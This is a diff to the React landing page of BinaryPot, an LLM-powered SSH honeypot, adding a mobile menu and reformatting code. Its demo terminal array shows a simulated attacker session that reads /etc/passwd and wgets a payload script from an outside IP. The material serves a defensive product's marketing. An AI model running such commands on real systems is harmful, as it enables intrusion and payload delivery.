@@ -12,7 +12,10 @@ const TERMINAL_LINES = [
   { type: "prompt", text: "root@victim-server:~# cat /etc/passwd" },
   { type: "out", text: "root:x:0:0:root:/root:/bin/bash" },
   { type: "out", text: "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" },
-  { type: "prompt", text: "root@victim-server:~# wget http://185.220.101.34/payload.sh" },
+  {
+    type: "prompt",
+    text: "root@victim-server:~# wget http://185.220.101.34/payload.sh",
+  },
   { type: "err", text: "HTTP request sent, awaiting response... 200 OK" },
   { type: "sys", text: "[LLM] Generating realistic response..." },
   { type: "sys", text: "[LOG] Command captured → session BP-04218" },
@@ -142,6 +145,8 @@ const CountUp = ({ target, suffix = "" }) => {
 };
 
 const LandingPage = () => {
+  const [menuOpen, setMenuOpen] = useState(false);
+
   return (
     <div className="bp-landing">
       <div className="bp-bg-grid"></div>
@@ -163,6 +168,32 @@ const LandingPage = () => {
           <a href="#why-binarypot">Why BinaryPot</a>
           <a href="#contact">Contact</a>
         </nav>
+
+        {/* Hamburger */}
+        <div
+          className={`bp-hamburger ${menuOpen ? "active" : ""}`}
+          onClick={() => setMenuOpen(!menuOpen)}
+        >
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+
+        {/* Mobile menu */}
+        <div className={`bp-mobile-menu ${menuOpen ? "open" : ""}`}>
+          <a href="#about" onClick={() => setMenuOpen(false)}>
+            About
+          </a>
+          <a href="#service" onClick={() => setMenuOpen(false)}>
+            Service
+          </a>
+          <a href="#why-binarypot" onClick={() => setMenuOpen(false)}>
+            Why BinaryPot
+          </a>
+          <a href="#contact" onClick={() => setMenuOpen(false)}>
+            Contact
+          </a>
+        </div>
       </header>
 
       <main>
@@ -181,16 +212,22 @@ const LandingPage = () => {
               </h1>
 
               <p className="bp-hero-text">
-                BinaryPot is an LLM-powered SSH honeypot built to look believable,
-                hold attacker attention, and reveal real behavior through
-                realistic interaction.
+                BinaryPot is an LLM-powered SSH honeypot built to look
+                believable, hold attacker attention, and reveal real behavior
+                through realistic interaction.
               </p>
 
               <div className="bp-hero-actions">
-                <Link to="/signup-request" className="bp-btn bp-btn-primary bp-btn-large">
+                <Link
+                  to="/signup-request"
+                  className="bp-btn bp-btn-primary bp-btn-large"
+                >
                   Request Access
                 </Link>
-                <Link to="/login" className="bp-btn bp-btn-secondary bp-btn-large">
+                <Link
+                  to="/login"
+                  className="bp-btn bp-btn-secondary bp-btn-large"
+                >
                   Login
                 </Link>
               </div>
@@ -255,7 +292,7 @@ const LandingPage = () => {
 
         <section className="bp-section" id="about">
           <div className="bp-section-head">
-            <div className="bp-section-tag">{'// ABOUT'}</div>
+            <div className="bp-section-tag">{"// ABOUT"}</div>
             <h2 className="bp-section-title">
               A modern honeypot built for <span>real observation</span>
             </h2>
@@ -266,8 +303,8 @@ const LandingPage = () => {
               <div className="bp-mini-label">Believable</div>
               <h3>Looks and feels real</h3>
               <p>
-                BinaryPot responds like a live Linux environment, making attacker
-                interaction feel natural and uninterrupted.
+                BinaryPot responds like a live Linux environment, making
+                attacker interaction feel natural and uninterrupted.
               </p>
             </div>
 
@@ -293,7 +330,7 @@ const LandingPage = () => {
 
         <section className="bp-section" id="service">
           <div className="bp-section-head">
-            <div className="bp-section-tag">{'// OUR SERVICE'}</div>
+            <div className="bp-section-tag">{"// OUR SERVICE"}</div>
             <h2 className="bp-section-title">
               Deception that feels <span>convincing</span>
             </h2>
@@ -304,7 +341,8 @@ const LandingPage = () => {
               <div className="bp-service-icon">⬡</div>
               <h3>Realistic SSH deception</h3>
               <p>
-                A believable shell experience that keeps suspicious users engaged.
+                A believable shell experience that keeps suspicious users
+                engaged.
               </p>
             </article>
 
@@ -328,7 +366,7 @@ const LandingPage = () => {
 
         <section className="bp-section" id="why-binarypot">
           <div className="bp-section-head">
-            <div className="bp-section-tag">{'// WHY BINARYPOT'}</div>
+            <div className="bp-section-tag">{"// WHY BINARYPOT"}</div>
             <h2 className="bp-section-title">
               Why people choose <span>BinaryPot</span>
             </h2>
@@ -347,7 +385,8 @@ const LandingPage = () => {
               <div className="bp-why-number">02</div>
               <h3>Better visibility</h3>
               <p>
-                Track commands and activity clearly without clutter or confusion.
+                Track commands and activity clearly without clutter or
+                confusion.
               </p>
             </div>
 
@@ -355,7 +394,8 @@ const LandingPage = () => {
               <div className="bp-why-number">03</div>
               <h3>Made for learning</h3>
               <p>
-                Great for research, demonstrations, training, and cybersecurity study.
+                Great for research, demonstrations, training, and cybersecurity
+                study.
               </p>
             </div>
           </div>
@@ -365,22 +405,26 @@ const LandingPage = () => {
           <div className="bp-contact-panel">
             <div className="bp-contact-glow"></div>
             <div className="bp-contact-content">
-              <div className="bp-section-tag">{'// CONTACT US'}</div>
+              <div className="bp-section-tag">{"// CONTACT US"}</div>
               <h2>Ready to explore BinaryPot?</h2>
               <p>
-                Request access or email us directly to learn more about BinaryPot.
+                Request access or email us directly to learn more about
+                BinaryPot.
               </p>
 
               <div className="bp-contact-actions">
                 <a
-  href="https://mail.google.com/mail/?view=cm&fs=1&to=binarypot101@gmail.com&su=BinaryPot%20Inquiry"
-  className="bp-btn bp-btn-primary bp-btn-large"
-  target="_blank"
-  rel="noopener noreferrer"
+                  href="https://mail.google.com/mail/?view=cm&fs=1&to=binarypot101@gmail.com&su=BinaryPot%20Inquiry"
+                  className="bp-btn bp-btn-primary bp-btn-large"
+                  target="_blank"
+                  rel="noopener noreferrer"
                 >
                   binarypot101@gmail.com
                 </a>
-                <Link to="/signup-request" className="bp-btn bp-btn-secondary bp-btn-large">
+                <Link
+                  to="/signup-request"
+                  className="bp-btn bp-btn-secondary bp-btn-large"
+                >
                   Request Access
                 </Link>
               </div>
@@ -389,22 +433,26 @@ const LandingPage = () => {
         </section>
       </main>
 
-<footer className="bp-footer">
-  <div className="bp-footer-left">
-    <span className="bp-footer-brand">⬡ BinaryPot</span>
-    <span className="bp-footer-sep">|</span>
-    <span className="bp-footer-text">LLM-Powered SSH Honeypot</span>
-    <span className="bp-footer-sep">|</span>
-    <span className="bp-footer-text">
-      © {new Date().getFullYear()} BinaryPot
-    </span>
-  </div>
+      <footer className="bp-footer">
+        <div className="bp-footer-left">
+          <span className="bp-footer-brand">⬡ BinaryPot</span>
+          <span className="bp-footer-sep">|</span>
+          <span className="bp-footer-text">LLM-Powered SSH Honeypot</span>
+          <span className="bp-footer-sep">|</span>
+          <span className="bp-footer-text">
+            © {new Date().getFullYear()} BinaryPot
+          </span>
+        </div>
 
-  <div className="bp-footer-right">
-    <a href="#about" rel="noopener noreferrer">About</a>
-    <a href="#contact" rel="noopener noreferrer">Contact</a>
-  </div>
-</footer>
+        <div className="bp-footer-right">
+          <a href="#about" rel="noopener noreferrer">
+            About
+          </a>
+          <a href="#contact" rel="noopener noreferrer">
+            Contact
+          </a>
+        </div>
+      </footer>
     </div>
   );
 };
